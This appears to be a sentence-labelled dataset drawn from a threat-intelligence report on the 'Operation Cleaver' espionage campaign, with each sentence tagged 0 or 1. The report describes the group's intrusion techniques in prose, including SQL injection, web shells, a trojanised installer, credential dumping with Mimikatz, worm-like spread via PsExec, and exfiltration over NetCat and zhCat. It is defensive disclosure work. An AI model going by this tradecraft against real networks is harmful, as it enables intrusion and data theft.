Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this report , limiting our content to only that which can be definitively confirmed .	0
However , we have speculated on the possible motivations behind these attacks , given our deep knowledge and understanding of the cyber landscape .	0
We have made every effort to notify all affected entities prior to publishing this report .	0
Additionally , all personally identifiable information about the members of Operation Cleaver has been withheld .	0
We do n't care who the adversary is , where they work or reside , who they 're dating or what party photos they upload to Facebook – all we care about is preventing campaigns like Operation Cleaver from negatively affecting the real world .	0
This report is for the world 's cyber defenders – never give up ! Since at least 2012 , Iranian actors have directly attacked , established persistence in , and extracted highly sensitive materials from the networks of government agencies and major critical infrastructure companies in the following countries : Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the United States .	1
Iran is the new China .	0
Operation Cleaver has , over the past several years , conducted a significant global surveillance and infiltration campaign .	1
To date it has successfully evaded detection by existing security technologies .	1
The group is believed to work from Tehran , Iran , although auxiliary team members were identified in other locations including the Netherlands , Canada , and the UK .	0
The group successfully leveraged both publicly available , and customized tools to attack and compromise targets around the globe .	0
The targets include military , oil and gas , energy and utilities , transportation , airlines , airports , hospitals , telecommunications , technology , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies , and governments .	0
During intense intelligence gathering over the last 24 months , we observed the technical capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed Iranian effort .	0
As Iran 's cyber warfare capabilities continue to morph , the probability of an attack that could impact the physical world at a national or global level is rapidly increasing .	0
Their capabilities have advanced beyond simple website defacements , Distributed Denial of Service ( DDoS ) attacks , and Hacking Exposed style techniques .	0
With minimal separation between private companies and the Iranian government , their modus operandi seems clear : blur the line between legitimate engineering companies and state- sponsored cyber hacking teams to establish a foothold in the world 's critical infrastructure .	0
Iran 's rising expertise , along with their choice of victims , has compelled us to release this report sooner than we would have liked in order to expose Operation Cleaver to the world .	0
The evidence and indicators of compromise we provide in this report will allow potentially unaware victims to detect and eliminate Cleaver 's incursions into their networks .	0
Iran has been severely impacted by debilitating and extremely advanced malware campaigns since at least 2009 .	0
Famous examples of these efforts include industrial sabotage via Stuxnet ( 2009 - 2010 ) , and espionage with Duqu ( 2009 - 2011 ) as well as Flame ( 2012 ) .	1
These campaigns have targeted Iran's nuclear program , and oil and gas operations .	0
Stuxnet was an eye-opening event for Iranian authorities , exposing them to the world of physical destruction via electronic means .	1
Hacking campaigns sourced out of Iran are nothing new .	0
Since the early 2000 's , the information security industry as a whole has tracked teams like the Iranian Cyber Army , which mainly focuses on patriotic hacking ( website defacements ) .	0
After the release of Stuxnet , Iran 's motivations appear to have shifted .	0
Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the certificate compromises of Comodo and DigiNotar .	0
These attacks served as a warning , showcasing the rapid evolution of Iran 's hacking skills .	0
A major retaliation came in the form of 2012 's Shamoon campaign , which impacted RasGas and Saudi Aramco .	0
It 's estimated that Shamoon impacted over 30,000 computer endpoints and cost the affected companies tens-of-thousands of hours recovering from the attacks .	0
The direct financial impact from this retaliation and amount of downtime experienced were staggering .	0
Shamoon was truly a watershed event for security defenders .	0
It was the first glimpse into the real capabillity and intention of Iranian cyber operations .	0
We see the same motivation and intent here in Operation Cleaver : establishing a beachhead for cyber sabotage .	0
We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil's Distributed Denial of Service ( DDoS ) attacks against US banks .	0
These attacks were debilitating and impacted the availability of online banking services .	1
Yet more backlash was witnessed with FireEye's exposure of Operation Saffron Rose , an espionage campaign executed by the Ajax Security Team in 2014 .	0
In May 2014 , evidence emerged of a highly targeted waterhole attack that leveraged social media , dubbed Operation Newscaster , which was uncovered by iSight Partners .	1
In June 2013 , Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out '' non-stop '' attacks on '' [ Israel 's ] vital national systems '' including '' water , power and banking '' .	0
The following September of 2013 , the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy computers in San Diego 's NMCI ( Navy Marine Corp Intranet ) ,5 which we can confirm was part of Operation Cleaver .	0
While previously reported operations attributed to Iran have largely focused on Defense Industrial Base ( DIB ) companies , the United States Federal Government , or targets in Middle Eastern countries , Operation Cleaver has instead focused on a wide array of targets , including energy producers and utilities , commercial airlines and airports , military intelligence , aerospace , hospitals , and even universities – with only ten of the targets based in the United States .	0
Such broad targeting demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone .	0
They have bigger intentions : to position themselves to impact critical infrastructure globally .	0
The string cleaver is found several times in a variety of custom software used in Operation Cleaver , including : We believe our visibility into this campaign represents only a fraction of Operation Cleaver 's full scope .	0
We believe that if the operation is left to continue unabated , it is only a matter of time before the world 's physical safety is impacted by it .	0
While the disclosure of this information will be a detriment to our ability to track the activity of this group , it will allow the security industry as a whole to defend against this threat .	0
As such , we are exposing this cyber campaign early in an attempt to minimize additional real-world impact and prevent further victimization .	0
• Persian hacker names are used throughout the campaign including : Salman Ghazikhani , Bahman Mohebbi , Kaj , Parviz , Alireza , and numerous others .	0
• Numerous domains used in the campaign were registered in Iran .	0
• Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh Andishan , which translates to '' invention '' or '' innovation '' in Farsi .	0
• Source netblocks and ASNs are registered to Iran .	0
• Hacker tools warn when their external IP address traces back to Iran .	0
• The infrastructure is hosted through Netafraz.com , an Iranian provider out of Isfahan , Iran .	0
• The infrastructure utilized in the campaign is too significant to be a lone individual or a small group .	0
We believe this work was sponsored by Iran .	0
• US Military targets including NMCI in October 2013 .	0
Confirmed targeting of global government entities .	0
• Networks and systems targeted in critical industries like energy and utilities , oil and gas , and chemical companies .	0
• Assets ( both cyber and physical ) and logistics information were compromised at major airline operators , airports , and transportation companies .	1
• Various global telecommunications , technology , healthcare , aerospace , and defense companies were breached as part of the operation .	0
• Confidential critical infrastructure documents were harvested from major educational institutions around the world .	1
• Initial compromise techniques include SQL injection , web attacks , and creative deception- based attacks – all of which have been implemented in the past by Chinese and Russian hacking teams .	1
• Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and Windows privilege escalations , and were coupled with automated , worm-like propagation mechanisms .	1
• Customized private tools with functions that include ARP poisoning , encryption , credential dumping , ASP.NET shells , web backdoors , process enumeration , WMI querying , HTTP and SMB communications , network interface sniffing , and keystroke logging .	1
• The ability to build customized tools to compromise any target they choose .	0
• Private signing certificates of one victim were captured allowing the Operation Cleaver team to compromise the entirety of their organization .	1
• Over the past two years , Cylance has collected over 8GB of data including over 80,000 files of exfiltrated data , hacker tools , victim logs , and highly sensitive reconnaissance data .	0
• Data from sinkholed command and control servers has allowed us to track this active campaign .	0
• Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to empower the security community to detect existing compromises in their own organizations , as well as potentially block future attacks from these teams .	0
• This campaign continues Iran 's retaliation for Stuxnet , Duqu , and Flame .	0
• This is a state-sponsored campaign .	0
• There is a possibility that this campaign could affect airline passenger safety .	0
• This campaign 's intentions may be to damage Industrial Control Systems ( ICS ) , Supervisory Control and Data Acquisition ( SCADA ) systems , and impact Critical Infrastructure and Key Resources ( CIKR ) .	0
• This campaign could be a way to demonstrate Iran 's cyber capabilities for additional geopolitical leverage , due to the breadth and depth of their global targets .	0
• There is an intense focus on CIKR companies in South Korea , which could give Iran additional clout in their burgeoning partnership with North Korea .	0
In September 2012 , Iran signed an extensive agreement for technology cooperation agreement with North Korea , which would allow for collaboration on various efforts including IT and security .	0
• Iran is recruiting from within the universities and potentially using 'hackers for hire ' .	0
The Cleaver team targets some of the most sensitive global critical infrastructure companies in the world , including military , oil and gas , airlines , airports , energy producers , utilities , transportation , healthcare , telecommunications , technology , manufacturing , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies and governments .	0
Countries impacted include Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the US .	0
The following is a breakdown by country of which industries were targeted and/or victimized : Cleaver 's level of access into each organization varied greatly , including completely compromised systems and networks , Active Directory domain controllers and credentials , compromised data repositories and stolen VPN credentials .	1
Compromised systems include Microsoft Windows web servers running IIS and ColdFusion , Apache with PHP , many variants of Microsoft Windows desktops and servers , and Linux servers .	1
Compromised network infrastructure included Cisco VPNs as well as Cisco switches and routers .	1
Unlike Stuxnet , no exotic exploitations ( such as 0-days ) were observed .	0
Within our investigation , we had no direct evidence of a successful compromise of specific Industrial Control Systems ( ICS ) or Supervisory Control and Data Acquisition ( SCADA ) networks , but Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing them to directly affect the systems they run .	1
This data could enable them , or affiliated organizations , to target and potentially sabotage ICS and SCADA environments with ease .	1
We discovered over 50 victims in our investigation , distributed around the globe .	0
Ten of these victims are headquartered in the US and include a major airline , a medical university , an energy company specializing in natural gas production , an automobile manufacturer , a large defense contractor , and a major military installation .	0
The four targets in Israel and the five targets in Pakistan are comprised of education , aerospace , airports , airlines , healthcare and technology .	0
Further victims were identified in numerous Middle Eastern countries as well as ones in Northern Europe including the UK , France , and Germany .	0
Central America was not immune either with a large oil and gas company on the list .	0
In fact , oil and gas was a particular focal point for the Cleaver team , going after no less than nine of these companies around the world .	0
Universities were targeted in the US , India , Israel , and South Korea .	0
The attackers targeted research efforts , student information , student housing , and financial aid systems .	1
They had a penchant for pictures , passports , and any specifc identifying information .	0
Perhaps the most bone-chilling evidence we collected in this campaign was the targeting and compromise of transportation networks and systems such as airlines and airports in South Korea , Saudi Arabia and Pakistan .	0
The level of access seemed ubiquitous : Active Directory domains were fully compromised , along with entire Cisco Edge switches , routers , and internal networking infrastructure .	1
Fully compromised VPN credentials meant their entire remote access infrastructure and supply chain was under the control of the Cleaver team , allowing permanent persistence under compromised credentials .	1
They achieved complete access to airport gates and their security control systems , potentially allowing them to spoof gate credentials .	1
They gained access to PayPal and Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered access to the victim 's domains .	1
We were witnessed a shocking amount of access into the deepest parts of these companies and the airports in which they operate .	0
Despite today 's trend toward attacker attribution , we believe it offers little real benefit to the day-to-day cyber defender .	0
However , in this report we offer our observations on the sources of Operation Cleaver in order to benefit those that rely on attribution such as Law Enforcement .	0
Operation Cleaver is believed to consist of at least 20 hackers and developers , collaborating on projects and missions to support Iranian interests .	0
Many of the targets were predominately English-speaking and a majority of the team members were capable of reading and writing in English .	0
We present evidence that this team is operating , at least in part , out of Iran and in the interests of Iran .	0
The skills and behavior of the Operation Cleaver teams are consistent with , and in one case surpasses , Iran 's cyber capabilities as we know them today .	0
For a complete list of IPs and domains related to this campaign , please refer to the Indicators of Compromise section .	0
Over the course of multiple incident response engagements related to Operation Cleaver , we were able to identify a small set of IP addresses which were commonly used during the initial stages of an attack .	1
The IP address 78.109.194.114 served as a source for one of the primary attackers .	1
They were observed conducting SQL injections , controlling backdoors , as well as exfiltrating information using this address , and the address appears in multiple software configurations recovered from staging servers over a period of time .	1
This IP address was also observed in multiple software configurations .	0
This particular net block was used over an extended period of time , indicating these were under the Cleaver team's physical control .	0
Additionally , prior netblocks used by the same team demonstrated to us that this was n't simply a case of proxying or '' island hopping '' .	0
For more information see the Tarh Andishan section of this report .	0
The IP address 159.253.144.209 was a source for a secondary attacker in various compromises .	1
They were observed conducting SQL injection attacks .	1
While this IP was this registered in the Netherlands , we believe they used Softlayer 's Citrix demo environment to launch these attacks which is consistent with proxying or '' island hopping '' .	0
A number of Cleaver 's attack methods require a persistent server .	0
In many cases , these servers were referenced by domain names .	0
The following malicious domains are operated by this organization and are grouped by the registrant 's email address .	0
As is typical with malicious domains , the Whois data for most of these domains contained falsified information .	0
We managed to obtain a large collection of the internally developed tools used by the Cleaver team , many of which were developed by its members .	0
Due to operational security failures , these tools contain information that provided us insight into their organization and operations .	0
In the tool named Shell Creator 2 , there are three main components .	0
The creator generates an ASPX web shell using user input as well as a collection of templates .	1
The web shell could then be installed via xpcmdshell , or any other method which would grant the attacker write access .	1
The web shell is accessible by the shell client directly .	0
The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised computer .	0
We originally located it on a staging server being utilized for multiple attacks as well as a tool for sharing data between members of the organization 's team .	1
The shell client , which is developed in Java and is easily decompiled , is a simple interface with a feature to protect the operator from making a critical mistake .	0
When executed , and before any connection to an instance of the web shell is initiated , the shell client communicates with freegeoip.net in order to get the external IP address of the current user .	1
The country of origin is then shown to the user , to inform them of what country it appears they are connecting from .	0
The assumed purpose of this feature is to ensure that a proper proxy is in use , and the real origin of the attacker is not revealed .	0
After decompiling the shell client , we found the following code segment controlling the display of this IP location information .	0
This code handles the XML response from freegeoip.net , and displays the information as different colors based on different attributes .	0
For instance , if the string '' ERROR '' is in the response , the text is displayed with the color magenta .	0
If the string IRAN is in the response , the text is displayed with the color red .	0
It should be noted that no other country name contains the substring IRAN .	0
Net Crawler is a tool developed in C # that exhibits worm-like behavior in order to gather cached credentials from any and all accessible computers on an infected network .	1
This is done with Windows Credential Editor ( WCE ) and Mimikatz in combination with PsExec .	0
Different versions of this malware contain ASCII art which names the authoring group as Zhoupin ( in '' leetspeak '' as '' Zh0up ! n '' ) .	0
For more information on Net Crawler , see the Tactics , Techniques and Procedures section .	0
TinyZBot is a bot written in C # and developed by the Cleaver team .	0
It is the longest developed malware family discovered by this group , and has been used in campaigns for close to two years .	0
How it operates can vary greatly from version to version .	0
For a detailed technical analysis of TinyZBot , see the Tactics , Techniques and Procedures section .	0
As TinyZBot is developed in C # , many versions can be decompiled to code very similar to their originals , including names of namespaces .	0
Many versions were obfuscated with a legitimate tool for developers named SmartAssembly , which makes the recovery of some names implausible .	1
We obtained multiple versions from which we were able to recover many of the original names of variables and namespaces .	0
In a number of these samples , the primary namespace for TinyZBot is named ZhoupinCleaver .	0
In every version of TinyZBot that is not obfuscated , there is a code base referred to as Cleaver .	0
This code base is also shared in other malware developed by this organization , such as Csext .	0
PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January 2010 called MS10-015 , '' Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege '' , popularly known as the KiTrap0D exploit which was released publicly .	0
The Cleaver team clearly modified the source code and compiled a new version .	0
The only detectable modification was to change the original author 's name to instead display the following : Zhopin Exploit Team This is not the only case of this team relabeling others ' work as their own .	0
Logger module is a component of the PVZ ( PVZ is shorthand for Parviz , one of the members of the Cleaver team ) bot tool chain .	0
When executed , it will capture the user 's keystrokes and save them to a location which PVZ bot then exfiltrates .	1
The logger module binary 's file description value is the following : Roughly translated from Persian , this text says : This text could potentially be a note intended to stay internal , or could be an attempt to persuade an unsuspecting victim to assume the file is not malicious .	0
The Product Name value is GOOD FILE .	0
For more information on the PVZ bot tool chain , see the Tactics , Techniques , and Procedures section .	0
CCProxy is a publicly available proxy server for Windows , which can handle a variety of protocols .	0
We do not believe that this organization was involved in the development or modification of CCProxy , but they have been observed using it .	0
We recovered a CCProxy configuration , which exposed various operational details .	0
The configuration allowed for remote connections , limited by a username as well as a limited IP range .	0
The username was User-001 , which is the default value .	0
The limited IP range covered one IP : 78.109.194.114 .	0
This IP address is located in Iran , and is owned by Tarh Andishan .	0
The configuration also indicates which address the CCProxy server should listen on for incoming connections such as web ( 80 ) and mail ( 25 ) .	0
Log output from the network port scanning application NMAP was recovered from a staging server .	0
This log was generated during the usage of the nbrute utility , which brute-forces network credentials and relies on NMAP to do so .	1
The header of this NMAP log indicates that the computer used to run nbrute/nmap was set to Iran Daylight Time at the time of execution .	0
With no known victims located in Iran , it is likely that this was executed on an attacker 's computer , and not on a victim 's computer .	0
A configuration file for a Squid proxy server was recovered .	0
Figure 12 : Squid configuration file showing the use of Tarh Andishan 's IP address .	0
The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC comment appended in order to make it look like it was part of the default configuration .	0
It is likely this is the same reason a /28 net range was used , in order to not look like it was intended to only allow one IP .	0
This would give the same access to resources accessible from the Squid proxy server to this Iranian IP address .	0
Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email address tarh.andishan ( at ) yahoo.com .	0
The net blocks appear to rotate over time and registrant information is altered to accommodate ongoing operations and avoid potential public exposure .	0
The networks are included below as well as the last time that net block was observed as active .	0
There are many seemingly legitimate Tarh Andishan related companies inside Tehran , but strong connections to Iranian backing have been difficult to prove definitively .	0
'' Tarh Andishan '' is often translated as '' Thinkers '' , '' Innovators '' and '' Inventors '' .	0
The net blocks above have strong associations with state-owned oil and gas companies .	0
These companies have current and former employees who are ICS experts .	0
Tarh Andishan has been suspected in the past of launching attacks in the interest of Iran .	0
The operators of the blog IranRedLine.org , which comments on Iran 's nuclear weapons efforts , has mentioned in multiple posts having been the target of debilitating brute-force authentication attacks from IP addresses registered to the same Tarh Andishan team found in Cleaver .	1
In one of IranRedLine.org 's blog posts , the author speculates on Tarh Andishan 's involvement with the Iranian government by showing close proximity to SPND , the Organization of Defensive Innovation and Research ; however , the phone number listed under the registrant contact information has yet to be completely validated .	0
During this investigation , we were able to compile a considerable amount of information on some of the members of this organization .	0
The following profiles were built from reverse engineering , code analysis , open source intelligence , incident response and forensics work .	0
Personally identifiable information about these members is not being shared publicly as it could endanger their lives and would be irresponsible .	0
Parviz is a developer who worked on a variety of projects , and was primarily active in 2013 .	0
His development skillset is based around his ability to develop in C/C++ .	0
He has been observed using Visual Studio 2010 , and his tools are written exclusively for Windows .	0
Some of his tools were found to be packed with ASPack .	0
Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain .	0
Parviz is likely associated with the PVZ bot as his name in hardcoded into the PDB file paths .	0
The PVZ tool chain includes a variety of functionality , such as HTTP command and control communications with an ASPX server-side component , a denial of service tool they developed , and the public project named XYNTService used to run ordinary applications as services .	1
Nesha is one of the offensive members of this organization .	0
Nesha was seen in breaches involving SQL injection as well as other techniques .	1
Nesha often utilized web-based backdoors developed in ASPX , PHP as well as ColdFusion .	1
A copy of an MS08-067 exploit developed in Python was recovered in which Nesha shamelessly replaced the original author 's name with his own .	0
Nesha 's passwords very commonly include own handle .	0
His passwords were frequently stored as hashes in backdoors , but common hash cracking methods were able to recover the plaintext versions .	0
His observed password use is as follows : Cylance observed Nesha participating in compromises involving the following techniques : Nesha has additionally been identified using a variety of internally developed tools as well as the following publicly available tools : Alireza appears to be one of the senior developers of this organization .	0
His tools are commonly developed in C++ , Java , and C # ( desktop and ASPX ) .	0
These tools are often support tools , either monitoring the activity of other tools or supplementing the function of other tools gathering information during the infiltration process .	1
Alireza 's code appears to be reused internally on projects such as TinyZBot .	0
Alireza appears to be using a version control system for his code , and it is likely that others are using the same system .	0
Based on the paths , the version control system in use is likely Apache 's Subversion .	0
Use of a version control system is indicative of code sharing , but the use of an older system like Subversion , along with other evidence , suggests there is not a large amount of collaboration on projects and likely one developer working on each project at a time .	0
This is not behavior typical of a professional development team .	0
Alireza 's C # tools include the following techniques : Alireza 's Java tools include the following techniques : Alireza 's C++ tools include the following techniques : kaJ is a .NET	0
developer , and has only been observed working in C # .	0
He has less English language proficiency than others in the organization , and likely has a supplemental role during compromises .	0
He has been observed developing tools which cater to specific challenges in a compromise .	0
His notable project was named Net Crawler , and a technical analysis of this tool can be found in the Tactics , Techniques and Procedures section .	0
Thanks to a recovered test configuration for Net Crawler , we were able to determine that kaJ 's development computer has the name dev-castle , where he has the username kaJ and the password oaolrJ @ vad .	0
kaJ is believed to be the creator of the Zhoupin ASCII art displayed in Net Crawler .	0
kaJ 's projects include the following techniques .	0
Jimbp is a .NET	0
developer with minimal experience .	0
His projects appear to be supplemental to TinyZBot and are very simplistic .	0
It is believed he is the developer of the project Binder1 .	0
This project was a simple malware binder which required manual configuration when compiling .	0
His other work included creating a new service wrapper for TinyZBot .	0
Of course many associated Iranian hacker teams have been identified in public and private security circles .	0
Some of the teams publicly known today include Iranian Cyber Army , Ashiyane , Islamic Cyber Resistance Group , Izz ad-Din al-Qassam Cyber Fighters , Parastoo , Shabgard , Iran Black Hats and many others .	0
However , even though the TTPs of the Cleaver team have some overlap to techniques used by Iranian Cyber Army ( botnets ) , Ashiyane ( SQL injection ) and Syrian Electronic Army ( phishing and RATs ) , we believe this is largely the work of a new team .	0
Some connections to Ashiyane were discovered in our investigations including a reference to hussein1363 , who had prior ties to the hacker group .	0
Additional connections between team members and individuals exist but are predominantly speculative and have only been shared with law enforcement .	0
Ultimately we believe the Cleaver team is a mix of existing team members and new recruits pulled from the universities in Iran .	0
The Cleaver campaign used a variety of methods in multiple stages of attacks .	0
In this section we'll cover the commonly observed methods during different stages of the attack .	0
The initial compromise gets the attackers their first foothold into the target network .	0
Once the ability to execute arbitrary code has been established , an attacker 's job becomes quite a bit easier .	0
Since the vector of initial compromise is usually determined by what is vulnerable on the target , we 'll cover just a few of the techniques we 've seen Operation Cleaver use to initiate the compromise .	0
SQL injection is a very common and simple attack method .	1
It is made possible by a lack of input sanitization by the vulnerable application before supplying that input into a SQL database query .	0
SQL injection payloads used by this organization have been double encoded .	1
Double encoding SQL injection payloads allows for bypassing of various anti-exploitation filters , such as those supplied by Web Application Firewalls ( WAFs ) .	1
The attackers would enable xpcmdshell : Then connect outbound via anonymous FTP : Using messaging methods such as email , attackers can social engineer users into downloading and executing software , which quietly installs malware alongside of the desired program .	1
Operation Cleaver has employed this technique numerous times across different organizations .	0
The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct copy of a legitimate website at winresume.com .	0
This is how the original site looked : That 's not all they copied .	0
In order to infect users , they combined the original Easy Resume Creator Pro product with malware by using a binder they developed internally named Binder1 .	1
A binder is an application , which combines two executables ( desired software and malware ) into a single executable .	0
The resulting executable masquerades as the desired software .	1
The purpose is deception , to make the binder indistinguishable from the desired application .	1
When executed , both applications are written to a temporary directory and executed .	1
This way it appears that the desired application was executed , but the malware was also executed silently .	1
This attack evolved to appear more legitimate .	0
The attackers made the victims feel like they had a pending job opportunity at the industrial conglomerate Teledyne .	0
In order to take advantage of this job opportunity , the victim needed to use the fake résumé submission application supplied by the malicious recruiter .	1
Multiple domains were registered in order to make the download sites seem more realistic .	1
These domains included other companies as they tried to hit a wider audience .	0
At this point , the résumé submission application checks the Internet connection .	1
If it is unable to connect to the Internet , it will display a window to input proxy information .	1
When this information is entered , the results are cached in a location the dropped malware can access .	1
After an Internet connection is ensured , the malware ( TinyZbot ) is dropped and executed .	1
This clever scheme makes sure the malware can connect to the command and control server , and increases the chances that domain credentials are cached on the now infected machine .	1
Shortly after , the main application is launched .	1
The first résumé submission form requests contact information .	1
This form , like the rest of the submission forms , only stores the submitted information while the application is running .	1
As the infected user is going through and filling out all this information , the malware is running in the background , logging their keystrokes , retrieving their stored passwords , etc .	1
Once all the forms are filled out , the user goes to the submission form .	0
When the victim hits submit , the résumé submitter does a GET request to microsoft.com in order to make it seem like it is submitting something , then claims success .	1
This method is particularly effective not only because of its level of deception , but even if the victim suspects that they are infected with malware , they are not as likely to speak up about it , as they would need to explain why they were submitting a job application for another company .	0
Privilege escalation is a category of techniques that describe the process of going from a less privileged user on a compromised computer to a more privileged user .	1
This increase in privileges allows for the attacker to gain access to privleged areas of the operating system as well as to infect other computers on the target network .	1
This team did not utilize any novel methods of privilege escalation , but they were observed using a variety of publicly known exploits .	0
PrivEsc is a compiled exploit , which leverages the vulnerability commonly referred to as KiTrap0D ( CVE-2010-0232 ) .	1
The exploit allows for escalation of privileges on unpatched Windows operating systems from an unprivileged user to kernel-level privilege .	1
This vulnerability and the corresponding exploit were discovered and developed in 2010 .	0
The plagiarized version used in Operation Cleaver was compiled in May 2013 , with a slight modification to the public source code .	0
This modification changed the author 's details to Zhopin Exploit Team .	0
Pivoting is the process of leveraging access from one compromised computer in order to gain access to additional systems on the target network .	1
This can involve launching attacks from the compromised computer , or simply abusing access once it has been gained .	1
A very common method of pivoting on a predominantly Windows operating system based network is to extract domain credentials which have been used on the compromised computer from a credential cache .	1
There are a few well-known tools which are capable of doing this given sufficient privileges on the infected host .	1
Two of these tools used by Cleaver are Mimikatz and Windows Credential Editor .	0
Two similar applications were developed by Operation Cleaver in order automate the execution of Mimikatz .	1
These applications are zhMimikatz and MimikatzWrapper .	0
These applications store multiple versions of Mimikatz in their resources .	0
When executed , they determine which version of Mimikatz to use based on whether the computer 's version of Windows is 32-bit or 64-bit .	1
This technique is uncommon in malware and shows the advanced skillset of the Cleaver team .	0
Both tools were developed in C # .	0
In the following examples , the computer name is TheComputerName , the username of the logged in user is TheUser , and that user 's password is ThePassword .	0
At the time of execution , the system only has its own credentials available and no cached network credentials .	0
zhMimikatz executes the correct version of Mimikatz for the current system , and parses the results for any cached credentials .	1
Output from MimikatzWrapper is essentially the same as zhMimikatz , despite being a different Visual Studio project .	0
The only external difference is that MimikatzWrapper also logs these results to res.txt in the executing directory .	1
This can make it useful for tools like the PVZ tool chain and Csext to execute with logged results : Once an attacker has credentials extracted from the cache , whether in hash form or in plaintext form , PsExec can be used to run commands on any other computer which accepts those domain credentials .	1
If this technique is combined with cached credential dumping , it can be used to jump from computer to computer on a compromised network .	1
Net Crawler utilizes a cached credential dumping technique along with PsExec in order to worm throughout a network , collecting any and all credentials that it can extract from credential caches .	1
It has the ability to do this with both Windows Credential Editor and Mimikatz .	0
It starts by first extracting cached credentials from the infected computer 's cache .	1
Once this is complete , it then continues to scan a set of configured IP addresses on the local subnet to determine which IP addresses have SMB related ports open .	1
Then an iterative methodology is applied to brute forcing each SMB enabled target with each credential that was extracted from the cache .	1
When a positive result has been achieved , it will create a copy of itself with a modified configuration stored as a PE resource , then send and execute the copy utilizing PsExec .	1
This copy repeats the behavior of the original , but with already discovered credentials as well as newly discovered ones on the newly infected host .	1
Any credentials found are reported back to the original infection .	0
The following is a sample of some of the recovered results of Net Crawler executing on a live network : A more in depth analysis of Net Crawler , as part of the A Study in Bots series , will be available on Cylance 's blog .	0
MS08-067 is a vulnerability in Microsoft Windows made popular by the Conficker worm which can be exploited by a specially crafted packet to the operating system 's RPC network interface .	1
This vulnerability has been patched since October 2008 , but many networks have failed to update their systems even to this day .	0
Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability developed in Python .	0
Someone in the Cleaver team ( presumed to be Nesha ) modified the exploit to read '' By Nesha '' .	0
Jasus is an ARP cache poisoner developed by the Operation Cleaver team .	1
It makes use of WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning utilities , Jasus is poorly developed and without many useful features .	0
The primary positive attribute of Jasus is its poor detection ratio by the antivirus industry .	1
Cain & Abel is a publicly available toolkit , which covers a wide range of functionality that assists attackers once they have compromised a node on a network .	0
It has the ability to dump stored and cached credentials , and conduct attacks like ARP cache poisoning in order to capture credentials being transmitted on the network .	1
It also has a remotely installable trojan named Abel , which enables some of its functionality on a remote target .	1
We observed the Operation Cleaver team using Cain & Abel for extracting credentials from caches and the network when they are confident that there is little to no antivirus protection on the infected target .	1
Exfiltration is the process of moving information to an external site .	1
In this context , it is the process of stealing information without being detected .	1
Operation Cleaver has a strong focus on stealing confidential/privileged information , and they have utilized a few methods in order to facilitate this objective .	1
Cleaver Operations observed in 2013 mainly utilized FTP servers with anonymous access enabled in order to pilfer large quantities of information .	1
This allowed them to use existing command line utilities available on their targets in order to upload information .	1
This is a versatile technique as it does not require any additional software which could be detected .	0
These FTP servers were also observed during the infection process , as infected computers were often instructed to download additional files from these FTP servers , including backdoors and pivoting tools .	1
The following IP addresses hosted FTP servers that were used in the infection of targets or in the exfiltration of information .	1
NetCat is a network tool which has many valid purposes but can also be used for malicious purposes .	0
Its main functionality allows for a client and server communication channel , allowing for information to be transported over the network simply .	1
NetCat has an option when being compiled to enable or disable the ability for NetCat to execute a command after the connection is established .	1
This feature can be abused to enable a reverse connecting shell , which can be used to remotely control a target .	1
NetCat 's network communications are in plaintext , and could be viewed by an egress filter looking to block the exfiltration of sensitive information .	0
The Operation Cleaver team was observed attempting to use NetCat to exfiltrate information as well as use it as a reverse connecting shell .	1
The use of NetCat was later replaced with zhCat .	0
zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat .	0
Its main purpose is to create a channel that is capable of transporting information over the network .	1
The changes made in zhCat allow for this information to be transferred with inline obfuscation and/ or encryption .	1
This makes it more difficult to detect that privileged information is being exfiltrated .	1
The command line help ( of a particular version ) shows the following options : Multiple obfuscation/encryption methods are available .	0
The –h argument enables HTTP mode .	0
This makes the traffic between zhCat instances look like benign HTTP traffic .	1
For instance , if the attackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode , the client instance of zhCat would use the following command : The server instance would use the following command : When we run both of these , we can send information just by typing it into the terminal of the running application .	0
Information can be supplied by standard input .	0
If we observe the network communications during this transfer , we can see the following HTTP POST request .	1
Note : research into ebizmba.com did not turn up any additional evidence of being involved with the development of zhCat .	0
On the server side , we can see our message has been received : If stricter egress filtering is enabled , the attackers can use zhCat to also XOR encrypt the traffic with a shared key .	1
These keys are stored inside zhCat .	0
The following is the key used for XOR encryption : The \n represents hex character 0x0A , which is a new line character .	1
An attacker could set up a server instance of zhCat with the following command in order to enable both HTTP and XOR obfuscation : The client instance could then be invoked with the following command : Once again , information can be supplied via standard input .	1
Upon inspecting the network traffic again , we see the following HTTP POST request .	1
On the server side , we can see this information being received : zhCat has a variety of other features such as port mirroring as well as traffic redirecting .	1
PLink is one of the many utilities provided in the PuTTY ( SSH ) suite , which has many benign purposes .	0
It is capable of communicating over various protocols , the most notable being SSH .	0
The SSH protocol is a heavily utilized encrypted protocol , most commonly used for remote administration of UNIX based operating systems .	0
PLink is designed to implement some of the SSH functions related to forwarding traffic as well as other functionality .	0
Operation Cleaver uses PLink to forward local RDP ports to remote SSH servers .	1
This allows them to easily connect to RDP servers inside the networks of their victims .	1
These RDP connections can be used to exfiltrate information visually , as well as to remotely control the computers hosting the RDP servers .	1
Early Cleaver operations abused SMTP in order to exfiltrate information .	1
